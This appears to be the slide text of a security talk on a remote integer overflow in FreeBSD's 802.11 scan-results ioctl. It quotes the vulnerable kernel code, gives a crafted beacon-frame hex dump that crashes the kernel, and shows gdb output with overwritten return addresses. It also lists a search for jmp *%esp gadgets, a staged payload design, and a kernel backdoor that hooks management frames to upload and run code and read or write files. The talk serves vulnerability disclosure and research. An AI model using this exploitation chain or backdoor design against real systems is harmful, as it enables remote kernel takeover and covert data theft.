u_int8_t *p, *cp;
p = ireq->i_data;
space = ireq->i_len;
error = 0;
FreeBSD 802.11
Remote Integer Overflow
Code for function called by ioctl[SCAN_RESULTS] (2/3):
/* XXX locking */
nt =  &ic->ic_scan;
TAILQ_FOREACH(ni, &nt->nt_node, ni_list) {
/* NB: skip pre-scan node state */ 
if (ni->ni_chan == IEEE80211_CHAN_ANYC)
continue;
get_scan_result(sr, ni);  calculate isr_len and other struct variables
if (sr->isr_len > sizeof(u))
continue;
/* XXX */
if (space isr_len)
break;
cp = (u_int8_t *)(sr+1);
memcpy(cp, ni->ni_essid, ni->ni_esslen);  copy to stack-space of union u
cp += ni->ni_esslen;
FreeBSD 802.11
Remote Integer Overflow
Code for function called by ioctl[SCAN_RESULTS] (3/3):
if (ni->ni_wpa_ie != NULL) {
memcpy(cp, ni->ni_wpa_ie, 2+ni->ni_wpa_ie[1]);  copy to union u
cp += 2+ni->ni_wpa_ie[1];
}
if (ni->ni_wme_ie != NULL) {
memcpy(cp, ni->ni_wme_ie, 2+ni->ni_wme_ie[1]);  copy to union u
cp += 2+ni->ni_wme_ie[1];
}
error = copyout(sr, p, sr->isr_len);
if (error)
break;
p += sr->isr_len;
space -= sr->isr_len;
}
ireq->i_len -= space;
return error;
}
FreeBSD 802.11
Remote Integer Overflow
static void
get_scan_result(struct ieee80211req_scan_result *sr, const struct ieee80211_node *ni)
{
struct ieee80211com *ic = ni->ni_ic;
memset(sr, 0, sizeof(*sr));
sr->isr_ssid_len = ni->ni_esslen;
if (ni->ni_wpa_ie != NULL)
sr->isr_ie_len += 2+ni->ni_wpa_ie[1];
if (ni->ni_wme_ie != NULL)
sr->isr_ie_len += 2+ni->ni_wme_ie[1];
sr->isr_len = sizeof(*sr) + sr->isr_ssid_len + sr->isr_ie_len;
sr->isr_len = roundup(sr->isr_len, sizeof(u_int32_t));
if (ni->ni_chan != IEEE80211_CHAN_ANYC) {
sr->isr_freq = ni->ni_chan->ic_freq;
sr->isr_flags = ni->ni_chan->ic_flags;
}
...
}
FreeBSD 802.11
Remote Integer Overflow
static void
get_scan_result(struct ieee80211req_scan_result *sr, const struct ieee80211_node *ni)
{
struct ieee80211com *ic = ni->ni_ic;
memset(sr, 0, sizeof(*sr));
sr->isr_ssid_len = ni->ni_esslen;
if (ni->ni_wpa_ie != NULL)
sr->isr_ie_len += 2+ni->ni_wpa_ie[1];
if (ni->ni_wme_ie != NULL)
sr->isr_ie_len += 2+ni->ni_wme_ie[1];  isr_ie_len is a uint8_t !!!
sr->isr_len = sizeof(*sr) + sr->isr_ssid_len + sr->isr_ie_len;
sr->isr_len = roundup(sr->isr_len, sizeof(u_int32_t));
if (ni->ni_chan != IEEE80211_CHAN_ANYC) {
sr->isr_freq = ni->ni_chan->ic_freq;
sr->isr_flags = ni->ni_chan->ic_flags;
}
...
}
FreeBSD 802.11
Remote Integer Overflow
•
Test our theories
– Hardcode test-case into kernel
– Create a custom kernel with debugging facilities
– Modify kernel config:
     makeoptions     DEBUG=-g 
     options         GDB
     options         DDB # optional
     options         KDB
– Recompile & reboot
– Make sure DDB is enabled
     $ sysctl –w debug.kdb.current=ddb
FreeBSD 802.11
Remote Integer Overflow
– Trigger the affected code
– In this example ifconfig will do the work
Fatal trap 12: page fault while in kernel mode
fault virtual address   = 0x41414155
fault code              = supervisor write, page not present
instruction pointer     = 0x20:0xc06c405c
stack pointer           = 0x28:0xd0c5e938
frame pointer           = 0x28:0xd0c5eb4c
code segment            = base 0x0, limit 0xfffff, type 0x1b
                        = DPL 0, pres 1, def32 1, gran 1
processor eflags        = interrupt enabled, resume, IOPL = 0
current process         = 203 (ifconfig)
[thread pid 203 tid 100058 ]
Stopped at      ieee80211_ioctl_getscanresults+0x120:   subw   %dx,0x14(%eax)
FreeBSD 802.11
Remote Integer Overflow
•
Can it be triggered remotely?
– Who is calling this ioctl?
– Yes! wpa_supplicant regularly calls this ioctl
– wpa_supplicant is supplied in the base distribution
• Is needed for 802.1X authentication (WPA-PSK) etc.
•
We need to send raw frames
– BPF in NetBSD was extended to be able to send arbitrary IEEE 
802.11 frames
FreeBSD 802.11
Remote Integer Overflow
•
Switch to better debugging environment – GDB
– Configure kernel to allow kernel-debugging:
In /boot/device.hints:
hint.sio.0.flags="0x80”
– Then switch default debugger:
$ sysctl –w debug.kdb.current=gdb
http://www.freebsd.org/doc/en_US.ISO8859-1/books/developers-
handbook/kerneldebug.html
FreeBSD 802.11
Remote Integer Overflow
•
We prepare a beacon frame with large SSID, WPA and WME fields
16:32:33.155795 0us BSSID:cc:cc:cc:cc:cc:cc DA:ff:ff:ff:ff:ff:ff 
SA:cc:cc:cc:cc:cc:cc Beacon (XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX) [1.0* 2.0* 5.5 
11.0 Mbit] ESS CH: 1
0x0000:  ceef f382 c40b 0000 6400 0100 0020 5858  ........d.....XX
0x0010:  5858 5858 5858 5858 5858 5858 5858 5858  XXXXXXXXXXXXXXXX
0x0020:  5858 5858 5858 5858 5858 5858 5858 0104  XXXXXXXXXXXXXX..
0x0030:  8284 0b16 0301 01dd fc00 50f2 0141 4141  ..........P..AAA
0x0040:  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
...
0x0120:  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0x0130:  4141 4141 41dd fd00 50f2 0201 4141 4141  AAAAA...P...AAAA
0x0140:  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
...
0x0220:  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0x0230:  4141 4141                                AAAA
FreeBSD 802.11
Remote Integer Overflow
•
On target when frame is sent:
[New Thread 100058]
Program received signal SIGSEGV, Segmentation fault.
[Switching to Thread 100058]
0xc06c405c in ieee80211_ioctl_getscanresults 
(ic=0x41414141, ireq=0x41414141)
    at ../../../net80211/ieee80211_ioctl.c:1047
1047            ireq->i_len -= space;
FreeBSD 802.11
Remote Integer Overflow
(gdb) print ireq
$1 = (struct ieee80211req *) 0x41414141
(gdb) bt
#0  0xc06c405c in ieee80211_ioctl_getscanresults 
(ic=0x41414141, ireq=0x41414141)
    at ../../../net80211/ieee80211_ioctl.c:1047
#1  0x41414141 in ?? ()
#2  0x41414141 in ?? ()
#3  0x41414141 in ?? ()
#4  0x41414141 in ?? ()
#5  0x41414141 in ?? ()
#6  0x41414141 in ?? ()
FreeBSD 802.11
Remote Integer Overflow
(gdb) list ieee80211_ioctl_getscanresults 
1003    static int
1004    ieee80211_ioctl_getscanresults(struct ieee80211com 
*ic, struct ieee80211req *ireq)
1005    {
1006            union {
1007                    struct ieee80211req_scan_result res;
1008                    char data[512];     /* XXX shrink? */
1009            } u;
1010            struct ieee80211req_scan_result *sr = &u.res;
1011            struct ieee80211_node_table *nt;
1012            struct ieee80211_node *ni;
1013            int error, space;
1014            u_int8_t *p, *cp;
1015    
1016            p = ireq->i_data;
1017            space = ireq->i_len;
FreeBSD 802.11
Remote Integer Overflow
(gdb) x/150xw &u
0xd0c5e940:  0x096c0148   0x370000e0   0x8d000164   0x89905342
0xd0c5e950:  0x8482048e   0x0000160b   0x00000000   0x00000000
0xd0c5e960:  0x00fd2000   0x00000000   0x58585858   0x58585858
0xd0c5e970:  0x58585858   0x58585858   0x58585858   0x58585858
0xd0c5e980:  0x58585858   0x58585858   0x5000fcdd   0x414101f2
0xd0c5e990:  0x41414141   0x41414141   0x41414141   0x41414141
...
0xd0c5eb40:  0x41414141   0x41414141   0x41414141   0x41414141
0xd0c5eb50:  0x41414141   0x41414141   0x41414141   0x41414141
0xd0c5eb60:  0x41414141   0x41414141   0x41414141   0x41414141
0xd0c5eb70:  0x41414141   0x41414141   0x41414141   0x41414141
0xd0c5eb80:  0x41414141   0xd0c5eb41   0xc063b816   0xc1509d00
0xd0c5eb90:  0xc01c69eb   0xc16eec00
...
(gdb) print $ebp
$8 = (void *) 0xd0c5eb4c
FreeBSD 802.11
Remote Integer Overflow
•
We can overwrite the return-address, but with what?
– Address to a jmp ESP or equivalent
•
Search in kernel binary after the required byte sequence
$ search_instr.py  -s 0x003d4518 -f 0x00043c30 -v 
0xc0443c30 FreeBSD_GENERIC_i386_6.0
0xc0444797: 0xff 0xd7, call *%edi
0xc04486c4: 0xff 0xd7, call *%edi
...
0xc044c5dd: 0xff 0xd7, call *%edi
0xc044dd3d: 0xff 0xe4, jmp *%esp
0xc0450109: 0xff 0xd1, call *%ecx
...
FreeBSD 802.11
Remote Integer Overflow
•
Initial payload
– Can't use stack before overwritten return address
– Resides after the overwritten return address
– Limited to 32 bytes not to destroy a previous frame we want intact
– Stage a second payload that resides in received beacon frame (in a 
kernel list)
FreeBSD 802.11
Remote Integer Overflow
•
Second stage payload
– Allocate memory for backdoor
– Copy head of backdoor to allocated area
– Save the original management-frame handler function pointer
– Overwrite original handler with a pointer to our backdoor
– Restore stack frame two levels up before returning
– Return an empty scan list and no error
FreeBSD 802.11
Remote Integer Overflow
•
Backdoor in place
– Backdoor function receives all management-frame
– Look for magic number at a fixed position, within WPA IE field
–  First command initializes the backdoor
–  If no magic number found, pass frame to real handler
ieee802.11 
frame..
magic number
cmd. len
offset: 88
cmd. type
offset: 102 offset: 103
cmd. data
offset: 104
FreeBSD 802.11
Remote Integer Overflow
•
Backdoor in place
– Send back response as a probe-response
– Payload is included in the optional response field
– Spoofed source/destination MAC addresses
FreeBSD 802.11
Remote Integer Overflow
•
Backdoor command type
– Ping backdoor
• Every ping has a unique 32-bit identifier
• Send back pong response including identifier
– Upload backdoor-code
• Every upload has a 16-bit offset and 251 bytes of possible data
• Send back ACK response with ACK'd offset 
– Execute backdoor-code
• All commands have a variable argument data field
• Send back execution result
FreeBSD 802.11
Remote Integer Overflow
•
Upload and execute command
– The only primitives needed to implement plug-ins
– Plug-ins doesn't need to handle the actual communication part
•
Fileserver plug-in
– Read file, in 128 byte chunks
– Stat file, get state information of file
– Write (and possibly create) file, in 128 byte chunks
FreeBSD 802.11
Remote Integer Overflow
•
Do file system operations the way the kernel does it
–
Extract the essential functions required for the operations
–
Open and read file example:
•
Initialize a struct nameidata, as the NDINIT() macro 
does
•
Make sure the current threads process has a working 
directory: 
td->td_proc->p_fd->fd_cdir = rootvnode;
•
Try lookup vnode with vn_open()
•
Do the actual read with vn_rdwr()
•
Unlock and close vnode using VOP_UNLOCK_APV() and 
vn_close()
FreeBSD 802.11
Remote Integer Overflow
•
Last words
– Net80211 framework in *BSD is a huge work and deserves credit, 
brought a lot of good things with it
– ... but might need some cleaning up and security auditing
FreeBSD 802.11
Remote Integer Overflow
Demonstration
FreeBSD 802.11
Remote Integer Overflow